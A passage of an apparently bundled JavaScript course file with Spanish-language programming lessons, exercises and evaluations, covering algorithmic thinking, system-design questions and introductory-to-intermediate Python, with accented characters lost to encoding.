*   **Propuesta A:** Arquitectura de microservicios usando Rust, con bases de datos distribuidas y comunicacin via gRPC. (Altsima performance, muy compleja, difcil de contratar gente).
*   **Propuesta B:** Aplicacin monoltica en Node.js, base de datos Postgres clsica y REST. (Performance suficiente, desarrollo rpido, fcil de encontrar programadores).

Si la empresa es una startup con 3 meses de pista (dinero) restante, cul eliges y por qu? Y si la empresa es Google buscando optimizar procesos de bsqueda? Justifica tu rol como Arquitecto.
`,completed:!1,isProject:!0},{id:"prog-bases-ejercicios-junior",title:"Bases de la Programacin (Junior)",level:"junior",content:`# Ejercicios: Bases de la Programacin (Junior)

Es hora de poner a prueba tu lgica! Recuerda que aqu no importa la sintaxis de un lenguaje, sino cmo piensas el problema.

---

## 1. El Algoritmo de la Llamada Perdida
**Contexto:** Quieres llamar a tu mam por telfono.
**Consigna:** Escribe un algoritmo de 7 pasos usando las bases que vimos. S preciso.
1. [Inicio]
2. ...
3. ...
4. ...
5. ...
6. ...
7. [Fin]

---

## 2. Detective de Variables
**Contexto:** Ests diseando un sistema para una veterinaria.
**Consigna:** Nombra la variable y elige el tipo de dato correcto (Nmero, Texto o Booleano) para:
*   El nombre del perro.
*   El peso del perro.
*   Si el perro tiene sus vacunas al da.
*   Cuntas veces comi hoy.

---

## 3. El Semforo Lgico
**Contexto:** Ests programando un semforo inteligente.
**Consigna:** Escribe en pseudocdigo la lgica de decisin usando SI... SINO.
*   Si el color es "Rojo", mostrar "Detenerse".
*   Si el color es "Amarillo", mostrar "Precaucin".
*   Si el color es "Verde", mostrar "Avanzar".

---

## 4. El Repetidor de Tareas
**Contexto:** Un profesor te castig y debes escribir 100 veces "No debo hablar en clase".
**Consigna:** Escribe un bucle (PARA o MIENTRAS) que haga esto por ti. No olvides que necesitas una variable contador.

---

## 5. El Traductor de Funciones
**Contexto:** Necesitas una funcin que nos diga si una persona es "Anciano" (ms de 65 aos).
**Consigna:**
1. Define la funcin \`EsAnciano\`.
2. Qu **parmetro** recibe?
3. Escribe la lgica interna (el SI).
4. Qu **retorna**? (Verdadero o Falso?).

---

No te rindas! Si alguno te cuesta, vuelve a leer la leccin correspondiente. La lgica es un msculo que se entrena.     
`,completed:!1,isProject:!0},{id:"prog-bases-ejercicios-semi-senior",title:"Pensamiento Algortmico Semi-Senior",level:"semi-senior",content:`# Ejercicios: Pensamiento Algortmico Semi-Senior

Desafa tu capacidad de anlisis. Aqu no cuenta el cdigo, cuenta la **estrategia**.

---

## 1. El Cruce del Ro (Optimizacin de Recursos)
**Contexto:** Un granjero debe cruzar un ro con un lobo, una cabra y una col. Solo tiene un bote donde cabe l y una cosa ms. 
*   Si el lobo se queda solo con la cabra, se la come.
*   Si la cabra se queda sola con la col, se la come.

**Consigna:**
*   Escribe el algoritmo para cruzar a todos a salvo.
*   Cuntos viajes (ida y vuelta) son necesarios en total?
*   Este es un problema de **estados**. Qu estructura usaras para representar qu hay en cada orilla?

---

## 2. El Buscador Ineficiente
**Contexto:** Tienes un array de 1.000.000 de IDs de usuarios ordenados de menor a mayor. Necesitas encontrar si el ID \`987.654\` existe.
Un programador Junior hace un bucle \`for\` desde 0 hasta el final.

**Consigna:**
*   Explica por qu el enfoque del Junior es malo en este caso especfico.
*   Propn un algoritmo mejor (puedes describirlo en pasos).
*   Cuntas comparaciones como mximo realizara tu algoritmo vs el del Junior?

---

## 3. El Validador de Parntesis (Uso de Stack)
**Contexto:** Un compilador debe revisar si un cdigo tiene los parntesis bien cerrados. Ejemplo: \`( ( ) [ ] )\` est bien, pero \`( [ ) ]\` est mal.

**Consigna:**
*   Por qu un simple contador de "parntesis abiertos vs cerrados" no sirve para detectar el error en \`( [ ) ]\`?
*   Explica cmo usaras una **Pila (Stack)** para resolver este problema de forma infalible.

---

## 4. Prioridad en la Guardia Mdica
**Contexto:** En un hospital, los pacientes no se atienden por orden de llegada, sino por gravedad (Triage). 
*   Rojo: Emergencia (Atencin inmediata).
*   Amarillo: Urgente.
*   Verde: No urgente.

**Consigna:**
*   Disea el flujo de datos. Si llegan 3 pacientes "Verdes", luego 1 "Rojo" y luego 1 "Amarillo", en qu orden se atienden?
*   Qu estructura de datos permitira insertar a un paciente "Rojo" al principio de la fila de espera sin tener que mover a todos los dems?

---

A pensar! Un gran programador se nota en el papel antes que en la pantalla.       
`,completed:!1,isProject:!0},{id:"prog-bases-ejercicios-senior",title:"Ejercicios de Arquitectura: Bases de la Programacin (Senior)",level:"senior",content:`# Ejercicios de Arquitectura: Bases de la Programacin (Senior)

Bienvenido, Arquitecto. Estos desafos no se resuelven con sintaxis, sino con visin sistmica. No busques la "respuesta correcta", busca la "justificacin tcnica slida".

---

## 1. El Sistema de Votacin Global
**Contexto:** Debes disear un sistema para el mundial de ftbol donde 1.000 millones de personas votan al "Jugador del Partido" en los ltimos 5 minutos de juego.
**Desafo:**
*   La base de datos colapsar si intentas escribir cada voto en tiempo real.
*   El resultado debe mostrarse en pantalla gigante 30 segundos despus de terminar el partido.
**Consigna:**
1.  Describe una estrategia de **agregacin** de datos.
2.  Usaras una base de datos relacional para contar los votos? Por qu s o no?
3.  Cmo manejaras los votos duplicados desde un mismo celular?

---

## 2. Refactorizacin de un Sistema Legacy
**Contexto:** Trabajs en un banco. El sistema que calcula los intereses es un bloque de cdigo COBOL de hace 30 aos que nadie se atreve a tocar. Se quiere migrar a una tecnologa moderna.
**Desafo:** No pods apagar el banco ni un segundo.
**Consigna:**
1.  Explica cmo aplicaras el **Strangler Pattern** (Patrn de Estrangulamiento) para esta migracin.
2.  Cmo aseguraras que el nuevo sistema calcula EXACTAMENTE lo mismo que el viejo antes de activarlo definitivamente?

---

## 3. El Dilema del Mensaje que no se puede perder
**Contexto:** Un sistema mdico debe enviar alertas crticas de signos vitales desde un monitor a una central de enfermera.
**Desafo:** La red WiFi del hospital puede caerse.
**Consigna:**
1.  Qu pasara si uss un protocolo que no garantiza entrega (como UDP)?
2.  Propn una solucin de **re-intento (Retries)** y **almacenamiento temporal (Local Storage)**.
3.  Cmo detectara el sistema que un monitor se desconect totalmente?

---

## 4. Optimizacin de un Feed Social
**Contexto:** Un usuario con 10 millones de seguidores postea una foto.
**Desafo:** Si al postear debemos buscar a cada seguidor y poner la foto en su "muro", la base de datos se bloquea por horas (Write amplification).
**Consigna:**
1.  Compara la estrategia de **Push** (escribir en el muro de cada seguidor al postear) vs **Pull** (que el seguidor busque los posts de sus seguidos al abrir la app).
2.  Qu estrategia usaras para usuarios "normales" vs usuarios "celebridades"? (Solucin hbrida).

---

Excelente trabajo! Estos son los problemas que definen la carrera de un Senior.       
`,completed:!1,isProject:!0},{id:"prog-bases-evaluacion-junior",title:"Bases de la Programacin - Nivel Junior",level:"junior",content:`# Evaluacin Tcnica: Bases de la Programacin - Nivel Junior

Esta evaluacin mide la capacidad del estudiante para comprender la lgica fundamental, el flujo de datos y la estructuracin bsica de algoritmos sin depender de un lenguaje especfico.

---

## 1. Fundamentos Tericos (Conceptos)
Responde brevemente a las siguientes preguntas:
*   Cul es la diferencia entre un **Algoritmo** y un **Programa**?
*   Para qu sirve una **Variable** y por qu es importante elegir un buen nombre?
*   Explica con una analoga de la vida real qu es una **Funcin**.

## 2. Abstraccin y Flujo (Entrada, Proceso, Salida)
Completa la tabla lgica para un sistema de **"Compra de caf en mquina automtica"**:
*   **Entradas:** (Menciona al menos 3)
*   **Proceso:** (Resume el algoritmo en 3 pasos)
*   **Salida:** (Resultado final)

## 3. Lgica de Control (Interpretacin de Pseudocdigo)
Observa el siguiente bloque y responde qu mostrar la pantalla si la variable \`edad\` es igual a **18**:

\`\`\`text
Variable edad = 18
SI (edad > 18) ENTONCES:
    Mostrar: "Mayor de edad"
SINO SI (edad == 18) ENTONCES:
    Mostrar: "Tienes justo 18"
SINO:
    Mostrar: "Menor de edad"
FIN SI
\`\`\`
**Tu respuesta:** ________________________

## 4. Resolucin de Problemas: El Semforo Nocturno
**Contexto:** Un semforo debe cambiar a modo "Precaucin" (luz amarilla intermitente) solo si la hora es despus de las 00:00 y antes de las 06:00.
**Consigna:** Escribe el algoritmo lgico (en pasos o pseudocdigo) para este comportamiento.

## 5. Ejercicio Mental: Bucles
Imagina un contador que debe mostrar los nmeros del 10 al 1. Al llegar al 1, debe decir "Ignicin!".
Escribe los pasos necesarios usando una estructura de **Bucle**.

---

## Criterios de Aprobacin
*   **60% - Conocimiento Base:** Identifica correctamente tipos de datos y flujo de informacin.
*   **80% - Lgica Aplicada:** Resuelve el problema del semforo con condicionales coherentes.
*   **100% - Maestra Junior:** El algoritmo del bucle es exacto y no genera ciclos infinitos.

Mucho xito! Ests construyendo las bases de tu futuro.    
`,completed:!1,isProject:!0},{id:"prog-bases-evaluacion-semi-senior",title:"Bases de la Programacin - Nivel Semi-Senior",level:"semi-senior",content:`# Evaluacin Tcnica: Bases de la Programacin - Nivel Semi-Senior

Esta evaluacin se enfoca en la eficiencia algortmica, la eleccin de estructuras de datos y la capacidad de descomponer problemas complejos de software.

---

## 1. Anlisis de Complejidad (Big O)
Ordena las siguientes complejidades de la ms eficiente a la menos eficiente y pon un ejemplo de una operacin comn para cada una:
1.  **O(n)**
2.  **O(1)**
3.  **O(n)**

## 2. Estructuras de Datos y Decisiones
Para cada escenario, elige la estructura de datos ms adecuada (Array, Pila, Cola, Mapa o Set) y justifica tu eleccin:
*   **Caso A:** Un sistema para gestionar el botn "Deshacer" (Undo) en un editor de texto.
*   **Caso B:** Almacenar una lista de 5,000 usuarios donde necesitamos buscar a uno especficamente por su DNI de forma instantnea.
*   **Caso C:** Un sistema de impresin donde los documentos deben imprimirse en el orden en que fueron enviados.

## 3. Optimizacin de Algoritmos
Tienes el siguiente problema: "Encontrar si dos listas de 10,000 nombres tienen algn nombre en comn".
*   **Enfoque 1:** Un bucle dentro de otro comparando todos contra todos.
*   **Enfoque 2:** Cargar la primera lista en un **Set** y luego recorrer la segunda lista verificando si el nombre existe en el Set.

**Pregunta:** Cul es la diferencia de performance estimada entre ambos y por qu el Enfoque 2 es superior para un Semi-Senior?

## 4. Descomposicin de Problemas
Describe la descomposicin (sub-problemas) para un sistema de **"Reserva de Asientos en un Cine"**. 
Menciona al menos 4 sub-procesos independientes que deben ocurrir para que la reserva sea exitosa y segura (evitando que dos personas reserven lo mismo).

## 5. Ejercicio Mental: Lgica de Negocio
Disea el algoritmo para un sistema de **"Descuento Progresivo"**:
*   Si compra 1 unidad: 0% descuento.
*   Si compra de 2 a 5 unidades: 10% descuento.
*   Si compra ms de 5 unidades: 20% descuento.
*   *Condicin especial:* Si el usuario es "VIP", se le suma un 5% extra al descuento final.

Escribe el pseudocdigo asegurndote de que los descuentos no se apliquen de forma errnea (ej. que no se sumen 10% + 20% si compra 6).

---

## Criterios de Aprobacin
*   **Razonamiento Estructural:** Elige las estructuras de datos correctas para los casos planteados.
*   **Conciencia de Performance:** Identifica y evita algoritmos de complejidad cuadrtica O(n).
*   **Modularidad:** Divide problemas grandes en piezas pequeas y manejables.

Demuestra tu nivel tcnico!    
`,completed:!1,isProject:!0},{id:"prog-bases-evaluacion-senior",title:"Bases de la Programacin - Nivel Senior (Arquitectura)",level:"senior",content:`# Evaluacin Tcnica: Bases de la Programacin - Nivel Senior (Arquitectura)

Esta evaluacin mide la visin sistmica, la capacidad de evaluar trade-offs y la toma de decisiones arquitectnicas bajo escenarios de alta demanda o restricciones crticas.

---

## 1. Pensamiento Sistmico y Efectos Secundarios
Imagina un sistema de E-commerce donde, al realizar una venta, se dispara un proceso que actualiza el stock, enva un mail de confirmacin y genera una factura.
*   **Problema:** El servidor de correos est lento y tarda 10 segundos en responder.
*   **Anlisis Senior:** Cmo afecta este retraso a la experiencia de compra del usuario si el proceso es sncrono? Propn una solucin basada en **Pensamiento Sistmico** para desacoplar estos procesos.

## 2. Evaluacin de Trade-offs: El Dilema de la Consistencia
Debes disear un sistema de **"Contador de Likes"** para una celebridad con 100 millones de seguidores.
*   **Opcin A (Consistencia Fuerte):** Cada like actualiza la base de datos inmediatamente. El nmero es 100% exacto siempre.
*   **Opcin B (Consistencia Eventual):** Los likes se acumulan en memoria (cache) y se graban en la base de datos cada 5 minutos. El nmero puede tener un ligero retraso.

**Pregunta:** Cul elegiras para escalar a millones de usuarios simultneos y por qu? Justifica los riesgos de cada una.

## 3. Resolucin de Problemas Complejos: El "Vuelo Cancelado"
Disea la estrategia lgica para un sistema que debe reubicar a 300 pasajeros de un vuelo cancelado en otros vuelos disponibles de la misma aerolnea.
1.  Qu factores de **prioridad** tendras en cuenta? (Abstraccin).
2.  Cmo evitaras que el algoritmo entre en un bucle infinito buscando conexiones?
3.  Qu pasara si el sistema tarda 1 hora en calcular la solucin? Cmo lo optimizaras?

## 4. Gestin de Errores y Resiliencia
Define una estrategia de **"Circuit Breaker"** para un sistema que depende de una API externa (ej: un servicio de mapas). 
Cmo decidiras en qu momento "abrir el circuito" y dejar de llamar a la API externa para no saturar tu propio sistema?

## 5. Ejercicio Mental: Liderazgo y Deuda Tcnica
Un desarrollador Junior propone una solucin que funciona pero es O(n) y difcil de leer. El plazo de entrega es hoy mismo.
1.  Dejas que el cdigo pase a produccin para cumplir el plazo o lo frenas? 
2.  Cmo documentaras esta **Deuda Tcnica** si decides avanzar?
3.  Cmo explicaras al negocio el riesgo de no arreglarlo en el corto plazo?

---

## Criterios de Aprobacin Senior
*   **Visin de Negocio:** No busca la "mejor tcnica" sino la ms adecuada para el contexto.
*   **Resiliencia:** Sus soluciones contemplan fallos y estados de error.
*   **Escalabilidad:** Identifica cuellos de botella antes de que ocurran.
*   **Comunicacin:** Capacidad de justificar decisiones complejas de forma clara.

Felicidades por llegar aqu, Arquitecto!        
`,completed:!1,isProject:!0}]},x1={id:"python",title:"Python para Backend y Scripts",description:"Aprende el lenguaje ms verstil del mundo. Desde scripts de automatizacin hasta potentes servidores web.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"python-01-intro-python",title:"Python - El lenguaje que conquist el mundo",level:"junior",content:`# Leccin 01: Python - El lenguaje que conquist el mundo

**Python** es un lenguaje de programacin de alto nivel, interpretado y multiparadigma. Es conocido por su sintaxis clara y legible, que se asemeja al ingls.

## 1. Por qu Python?
*   **Legibilidad:** Menos lneas de cdigo para hacer lo mismo que en otros lenguajes.
*   **Versatilidad:** Se usa en Desarrollo Web (Django, Flask), Ciencia de Datos (Pandas, NumPy), Inteligencia Artificial (PyTorch, TensorFlow) y Automatizacin.
*   **Comunidad:** Millones de libreras listas para usar.

## 2. Sintaxis Bsica
En Python, los bloques de cdigo se definen por **Indentacin** (sangra), no por llaves \`{}\`.

Let's compare JS vs Python:

**JavaScript:**
\`\`\`javascript
if (x > 0) {
    console.log("Positivo");
}
\`\`\`

**Python:**
\`\`\`python
if x > 0:
    print("Positivo")
\`\`\`
Fjate que no hay punto y coma \`;\` al final de las lneas!

## 3. Tu primer programa
\`\`\`python
print("Hola Mundo desde Python")
# Esto es un comentario
\`\`\`

---

### Concepto Junior:
La indentacin en Python no es esttica, es **obligatoria**. Si mezclas espacios y tabs, o si indentas mal, el programa dar un \`IndentationError\` y no funcionar.
`,completed:!1},{id:"python-02-condicionales-variables",title:"Condicionales y Variables",level:"junior",content:'# Leccin 02: Condicionales y Variables\n\nEn Python no necesitas declarar el tipo de variable. Simplemente usas el nombre y el valor (`x = 5`). A esto se le llama **Tipado Dinmico**.\n\n## 1. Variables\n```python\nx = 5                # Entero (int)\ny = 3.14             # Flotante (float)\nnombre = "Juan"      # Cadena de texto (str)\nes_valido = True     # Booleano (bool) - Ojo: Mayscula en True/False!\nlista = [1, 2, 3]    # Lista (list)\n```\nNo existen `const` ni `let` ni `var`. Python asume la mejor opcin.\n\n## 2. Condicionales `if-elif-else`\nLa lgica principal es similar a otros lenguajes, pero con `:`.\n```python\nif edad >= 18:\n    print("Mayor de edad")\nelif edad >= 13:\n    print("Adolescente")\nelse:\n    print("Nio")\n```\n*   `if`: Si se cumple la condicin.\n*   `elif` (else if): Si no se cumpli la anterior, revisa esta.\n*   `else`: Si ninguna se cumpli.\n\n## 3. Operadores Lgicos\nEn JS usas `&&` y `||`. En Python usas `and`, `or` y `not`.\n```python\nif edad >= 18 and tiene_licencia:\n    print("Puede conducir")\n```\n\n---\n\n### Misin Junior:\nAcostmbrate a leer los mensajes de error de Python. Son muy claros: `SyntaxError: invalid syntax` suele ser que olvidaste los `:` o cerraste mal un parntesis.\n',completed:!1},{id:"python-03-loops-funciones",title:"Bucles y Funciones",level:"junior",content:'# Leccin 03: Bucles y Funciones\n\nEl corazn de la lgica de programacin en Python.\n\n## 1. Bucles `for` y `while`\n### Bucle `for`\nEn Python, el bucle `for` itera sobre secuencias u objetos iterables (como listas o strings).\n```python\nfrutas = ["manzana", "banana", "cereza"]\nfor fruta in frutas:\n    print(fruta)\n```\n\nSi quieres iterar un nmero fijo de veces, usas `range()`:\n```python\nfor i in range(5):\n    print(i) # Imprime 0, 1, 2, 3, 4\n```\n\n### Bucle `while`\nSe ejecuta mientras la condicin sea verdadera.\n```python\ncontador = 0\nwhile contador < 5:\n    print(contador)\n    contador += 1\n```\nOjo con los bucles infinitos! No existe `++` en Python, debes usar `+= 1`.\n\n## 2. Funciones (`def`)\nSe definen con la palabra clave `def`.\n```python\ndef saludar(nombre, edad=18):\n    return f"Hola {nombre}, tienes {edad} aos."\n\nmensaje = saludar("Ana", 25)\nprint(mensaje)\n```\n*   **f-strings:** `f"Texto {variable}"`. La forma moderna de interpolar variables (como las template literals de JS).\n*   **Parmetros por defecto:** Puedes definir valores predeterminados (`edad=18`).\n\n### Concepto Junior:\nEn Python, puedes devolver **mltiples valores** en una funcin.\n```python\ndef obtener_coords():\n    return 10, 20\n\nx, y = obtener_coords()\n```\nEsto es muy potente y evita tener que crear objetos solo para devolver dos datos simples.\n',completed:!1},{id:"python-04-estructuras-datos",title:"Estructuras de Datos - Listas, Tuplas y Diccionarios",level:"junior",content:`# Leccin 04: Estructuras de Datos - Listas, Tuplas y Diccionarios

Python destaca por sus estructuras de datos, que son muy potentes y fciles de usar.

## 1. Listas (\`list\`)
Son colecciones ordenadas y mutables de elementos. Soportan todos los tipos de dato (nmeros, strings, bool, etc.) y pueden mezclarse.
\`\`\`python
frutas = ["manzana", "banana", "cereza"]
frutas.append("naranja")  # Agregar al final
print(frutas[0])          # Acceder al primero
print(frutas[-1])         # Acceder al ltimo (Muy til!)
frutas.remove("banana")   # Eliminar por valor
\`\`\`

## 2. Tuplas (\`tuple\`)
Son colecciones ordenadas e inmutables (no puedes modificarlas). Ocupan menos memoria que las listas.
\`\`\`python
coordenadas = (10, 20)
# coordenadas[0] = 5  # Esto dara error: 'tuple' object does not support item assignment
\`\`\`
Se usan para datos que **no deberan cambiar** durante la ejecucin del programa, como configuraciones fijas o das de la semana.

## 3. Diccionarios (\`dict\`)
Son colecciones de pares Clave-Valor. Como los Objetos de JavaScript.
\`\`\`python
persona = {
    "nombre": "Ana",
    "edad": 25,
    "ciudad": "Madrid"
}
print(persona["nombre"])
persona["profesion"] = "Ingeniera" # Agregar nueva clave
\`\`\`

## 4. Sets (\`set\`)
Colecciones desordenadas de elementos nicos. tiles para **eliminar duplicados**.
\`\`\`python
numeros = [1, 2, 2, 3, 3, 3]
unicos = set(numeros) # {1, 2, 3}
\`\`\`

---

### Misin Junior:
Aprender la diferencia entre **Listas** (mutables) y **Tuplas** (inmutables). Si necesitas modificar los datos, usa una lista. Si son constantes, usa una tupla.
`,completed:!1},{id:"python-05-manejo-errores",title:"Manejo de Excepciones (`try-except`)",level:"junior",content:`# Leccin 05: Manejo de Excepciones (\`try-except\`)

Tu programa va a fallar. Lo importante no es evitar que falle, sino saber **recuperarse** del fallo.

## 1. Bloque \`try-except\`
En lugar de \`try-catch\` (JS), en Python usamos \`try-except\`.
\`\`\`python
try:
    numero = int(input("Introduce un nmero: "))
    resultado = 10 / numero
    print(resultado)
except ValueError:
    print("Ese no es un nmero vlido.")
except ZeroDivisionError:
    print("No puedes dividir por cero.")
except Exception as e:
    print(f"Ocurri un error inesperado: {e}")
finally:
    print("Esto se ejecuta siempre.")
\`\`\`

## 2. Lanzar Excepciones (\`raise\`)
Si detectas un error lgico en tu programa, puedes lanzar una excepcin manualmente.
\`\`\`python
def dividir(a, b):
    if b == 0:
        raise ValueError("El divisor no puede ser cero.")
    return a / b
\`\`\`

## 3. Context Managers (\`with\`)
Para manejar recursos externos (archivos, conexiones a BD) de forma segura.
\`\`\`python
with open("archivo.txt", "r") as f:
    contenido = f.read()
# Aqu el archivo se cierra automticamente, incluso si hubo error.
\`\`\`

---

### Concepto Junior:
Nunca uses un \`except:\` vaco a menos que sepas muy bien lo que haces. Ocultar todos los errorres hace imposible depurar (Debugging).
`,completed:!1},{id:"python-06-errores-comunes",title:"Errores Comunes de Principiante en Python",level:"junior",content:`# Leccin 06: Errores Comunes de Principiante en Python

Aprender de los errores de los dems te ahorrar horas de cabeza.

## 1. Modificar listas mientras las iteras
\`\`\`python
numeros = [1, 2, 3, 4]
for n in numeros:
    if n % 2 == 0:
        numeros.remove(n)  # MAL! Esto se salta elementos.
\`\`\`
**Solucin:** Itera sobre una copia \`for n in numeros[:]:\` o crea una nueva lista por comprensin.

## 2. Argumentos Mutables por Defecto
\`\`\`python
def agregar_item(item, lista=[]): # Peligro!
    lista.append(item)
    return lista

print(agregar_item(1)) # [1]
print(agregar_item(2)) # [1, 2] La lista se conserva entre llamadas!
\`\`\`
**Solucin:** Usa \`None\` como valor por defecto.
\`\`\`python
def agregar_item(item, lista=None):
    if lista is None:
        lista = []
    lista.append(item)
    return lista
\`\`\`

## 3. Ignorar PEP 8
Python tiene una gua de estilo oficial.
*   Usa \`snake_case\` para variables y funciones.
*   Usa \`CamelCase\` para clases.
*   Usa 4 espacios para la indentacin.
Ignorar esto hace que tu cdigo parezca amateur.

---

### Misin Junior:
Instala un linter (como \`flake8\` o \`pylint\`) en tu editor. Te avisar de estos errores antes de que ejecutes el cdigo.
`,completed:!1},{id:"python-07-practica-junior",title:"Prctica Python Junior: Scripting Real",level:"junior",content:`# Prctica Python Junior: Scripting Real

Acepta estos desafos para demostrar que dominas lo bsico.

---

## 1. El Analizador de Textos
**Consigna:** Crea un script que:
1.  Pida al usuario que escriba una frase.
2.  Cuente cuntas palabras tiene.
3.  Imprima las palabras en orden alfabtico.
4.  Diga cul es la palabra ms larga.
*Pista:* Usa \`input()\`, \`split()\`, \`len()\` y \`sort()\`.

## 2. El Filtrador de Emails
**Consigna:** Tienes una lista de strings con supuestos correos electrnicos:
\`\`\`python
emails = ["juan@gmail.com", "pedro", "maria@hotmail.com", "luis@"]
\`\`\`
Escribe una funcin que devuelva una nueva lista SOLO con los emails vlidos (que contengan "@" y al menos un punto "." despus del arroba).

## 3. La Calculadora con Memoria
**Consigna:** Crea una calculadora simple que:
1.  Pregunte dos nmeros.
2.  Pregunte la operacin (\`+\`, \`-\`, \`*\`, \`/\`).
3.  Guarde el resultado en una lista \`historial\`.
4.  Pregunte si quiere hacer otra operacin.
5.  Si dice que "no", imprima todo el historial de operaciones realizadas.
*Reto:* Maneja la divisin por cero con \`try-except\`.

---

### Resultado esperado:
Escribir cdigo Python limpio, usar estructuras de control correctamente y manejar errores bsicos.
`,completed:!1,isProject:!0},{id:"python-08-poo-clases",title:"Programacin Orientada a Objetos (POO)",level:"semi-senior",content:`# Leccin 08: Programacin Orientada a Objetos (POO)

Python es un lenguaje multiparadigma, pero todo en l es un objeto. Dominar las Clases es esencial para el nivel Semi-Senior.

## 1. Clases y Objetos
Una **Clase** es el plano (blueprint). Un **Objeto** es la casa construida usando ese plano.

\`\`\`python
class Perro:
    # El constructor (inicializador)
    def __init__(self, nombre, raza):
        self.nombre = nombre  # Atributo
        self.raza = raza

    # Un mtodo (funcin dentro de la clase)
    def ladrar(self):
        return f"{self.nombre} dice: Guau!"

# Instanciar el objeto
mi_perro = Perro("Firulais", "Labrador")
print(mi_perro.ladrar())
\`\`\`

## 2. El misterioso \`self\`
En Python, \`self\` es una referencia a la instancia actual. Es equivalente al \`this\` de Java o JavaScript, pero **debe pasarse explcitamente** como primer argumento en cada mtodo de instancia.

## 3. Encapsulamiento (Convencin)
Python no tiene \`private\` o \`protected\` estrictos como Java.
*   \`_variable\`: Un guion bajo indica "uso interno" (protected). Se puede acceder, pero no deberas.
*   \`__variable\`: Doble guion bajo activa el "Name Mangling", haciendo mucho ms difcil acceder desde fuera (private).

---

### Concepto Semi-Senior:
En Python, "We are all consenting adults". No se bloquea el acceso a variables privadas, se confa en que el programador respetar la convencin del guion bajo \`_\`.
`,completed:!1},{id:"python-09-herencia-polimorfismo",title:"Herencia y Polimorfismo",level:"semi-senior",content:`# Leccin 09: Herencia y Polimorfismo

Cuando construyes aplicaciones grandes, necesitas reutilizar cdigo y especializar comportamiento.

## 1. Herencia con \`super()\`
La palabra clave \`super()\` llama a la clase padre.
\`\`\`python
class Animal:
    def __init__(self, nombre):
        self.nombre = nombre

    def sonido(self):
        raise NotImplementedError("Subclase debe implementar esto")

class Gato(Animal):
    def __init__(self, nombre, edad):
        super().__init__(nombre)  # Llama al constructor de Animal
        self.edad = edad

    def sonido(self):
        return "Miau"
\`\`\`

## 2. Herencia Mltiple
Python permite que una clase herede de **mltiples** clases.
\`\`\`python
class Pato(Volador, Nadador):  # Cuidado con el MRO!
    pass
\`\`\`
*   **MRO (Method Resolution Order):** Es el algoritmo que usa Python para saber de qu clase padre hered el mtodo \`volar()\`.

## 3. Polimorfismo
El polimorfismo es la capacidad de tratar a objetos de diferentes clases de la misma manera.
*   Si \`Gato.sonido()\` y \`Perro.sonido()\` existen, puedes iterar una lista de animales y llamar a \`.sonido()\` sin importar la clase.

---

### Lo que hace un Semi-Senior:
Usa \`abc\` (Abstract Base Classes) para definir interfaces estrictas.
\`\`\`python
from abc import ABC, abstractmethod

class Forma(ABC):
    @abstractmethod
    def area(self): pass
\`\`\`
Si intentas instanciar \`Forma\`, Python lanzar un error. Obliga a las subclases a implementar \`area()\`.
`,completed:!1},{id:"python-10-modulos-paquetes",title:"Mdulos y Paquetes",level:"semi-senior",content:'# Leccin 10: Mdulos y Paquetes\n\nDivide y vencers. Un archivo Python es un mdulo. Una carpeta con archivos es un paquete.\n\n## 1. Importacin (`import`)\n```python\nimport math\nprint(math.pi)\n\nfrom math import sqrt\nprint(sqrt(16))  # 4.0\n```\n\n## 2. Paquetes: La estructura de carpetas\nUn **Paquete** es una carpeta que contiene un archivo especial llamado `__init__.py`.\n*   `__init__.py` le dice a Python: "Mrame, soy un paquete que se puede importar".\n\nEjemplo de estructura:\n`/mi_proyecto`\n  `/utils`\n    `__init__.py`  # Vaco o con imports internos\n    `fechas.py`\n    `logs.py`\n  `main.py`\n\nEn `main.py`:\n```python\nfrom utils.fechas import hoy\n```\n\n## 3. `if __name__ == "__main__":`\nEste bloque es crucial.\n```python\nif __name__ == "__main__":\n    print("Este cdigo solo se ejecuta si lanzas el script directamente")\n    # Si alguien hace import mi_script, NO se ejecuta este print\n```\nEs la forma de distinguir entre un "Programa" y una "Librera".\n\n---\n\n### Misin Semi-Senior:\nAprender la diferencia entre **Importacin Relativa** (`from . import algo`) y **Absoluta** (`from mi_proyecto.algo import algo`).\n',completed:!1},{id:"python-11-entornos-virtuales",title:"Entornos Virtuales y Gestor de Paquetes (pip)",level:"semi-senior",content:"# Leccin 11: Entornos Virtuales y Gestor de Paquetes (pip)\n\nPython tiene un problema: Si instalas una librera para el Proyecto A, afecta a todo el sistema. Si el Proyecto B necesita una versin antigua, se rompe. Solucin: Entornos Virtuales.\n\n## 1. El entorno virtual (`venv`)\nUn **Entorno Virtual** es una copia aislada de Python.\n```bash\npython -m venv .venv\n```\n*   Esto crea una carpeta `.venv` que contiene su propio ejecutable de Python y su propia carpeta de libreras `site-packages`.\n\n## 2. Activar el entorno\n*   **Linux/Mac:** `source .venv/bin/activate`\n*   **Windows:** `.venv\\Scripts\\activate`\n\n## 3. Gestor de paquetes (`pip`)\nCon el entorno activado, usa `pip install numpy`.\n\n## 4. `requirements.txt`\nEs el archivo donde listas las dependencias de tu proyecto.\n```python\n# Guardar las libreras actuales\npip freeze > requirements.txt\n\n# Instalar las libreras en un entorno nuevo\npip install -r requirements.txt\n```\n\n---\n\n### Misin Semi-Senior:\nNunca instales paquetes globales si puedes evitarlo. Aprende a usar `poetry` o `pipenv` si quieres ir ms all de los `requirements.txt`.\n",completed:!1},{id:"python-12-practica-semi-senior",title:"Prctica y Evaluacin: El Arquitecto Python",level:"semi-senior",content:'# Prctica y Evaluacin: El Arquitecto Python\n\nDemuestra que puedes estructurar cdigo limpio y modular.\n\n---\n\n## 1. Ejercicio Semi-Senior 1: El Sistema de Biblioteca\n**Consigna:** Modela una Biblioteca usando **POO**.\n*   Clase `Libro`: ttulo, autor, ao. Mtodo `__str__` para imprimirlo bonito.\n*   Clase `Biblioteca`: lista de libros. Mtodos `agregar_libro`, `buscar_libro`, `prestar_libro`.\n*   Un script `main.py` que importe estas clases desde un paquete `modelos/` e interacte con el usuario.\n\n## 2. Ejercicio Semi-Senior 2: Custom Exceptions\n**Escenario:** Tienes una funcin `procesar_pago(monto)`.\n*   Si el monto es negativo, lanza `MontoNegativoError`.\n*   Si el monto es 0, lanza `MontoCeroError`.\n*   Crea estas excepciones heredando de `Exception` y atrapalas en el bloque principal.\n\n## 3. Ejercicio Semi-Senior 3: Scripts Modulares\n**Consigna:** Crea un mdulo `utilidades.py` con funciones matemticas (factorial, fibonacci).\n*   En `main.py`, importa solo `factorial` usando `from ... import ...`.\n*   Asegrate de que `utilidades.py` tenga un bloque `if __name__ == "__main__":` para probar las funciones si se ejecutan directamente.\n\n---\n\n### Misin:\nUn programador Semi-Senior no solo escribe cdigo que 